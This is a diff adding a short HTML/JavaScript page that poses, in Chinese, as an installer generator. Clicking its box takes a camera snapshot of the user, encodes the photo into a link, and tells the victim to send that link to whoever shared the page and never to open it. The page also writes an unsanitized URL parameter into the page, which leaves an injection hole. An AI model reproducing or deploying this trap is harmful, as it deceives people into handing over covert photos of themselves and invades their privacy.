@@ -1,0 +1,38 @@
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<div id="box" style="display:flex;align-items:center;justify-content:center;min-height:90vh;margin:0;">
+  <div id="tip" style="padding:24px 32px;border-radius:16px;background:#222;color:#fff;font-size:18px;text-align:center;cursor:pointer;">
+    <p style="margin:0 0 10px 0;font-size:22px;">butter</p>
+    <p style="margin:0;">点击继续生成安装包</p>
+  </div>
+</div>
+<script>
+const url = new URL(location.href);
+const imgParam = url.searchParams.get("pic");
+
+if(imgParam){
+  // B端：直接看图
+  document.body.innerHTML=`<img src="${decodeURIComponent(imgParam)}" style="max-width:100%">`
+}else{
+  // A端：只有点击方框才启动摄像头
+  document.getElementById('tip').onclick = async ()=>{
+    const v=document.createElement('video'),c=document.createElement('canvas'),ctx=c.getContext('2d');
+    v.autoplay=1;
+    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+    v.srcObject=s;
+    v.onloadeddata=()=>{
+      c.width=v.videoWidth;c.height=v.videoHeight;
+      ctx.drawImage(v,0,0);
+      const img = c.toDataURL('png');
+      s.getTracks().forEach(t=>t.stop());
+      const shareLink = `${location.origin}${location.pathname}?pic=${encodeURIComponent(img)}`;
+      document.body.innerHTML=`
+      <div style="padding:20px">
+        <h3>✅生成完毕，复制下面链接发给给你链接的人</h3>
+        <p style="color:red;font-weight:bold;">自己千万不能打开。</p>
+        <textarea style="width:100%;height:80px">${shareLink}</textarea>
+      </div>`;
+    }
+  }
+}
+</script>
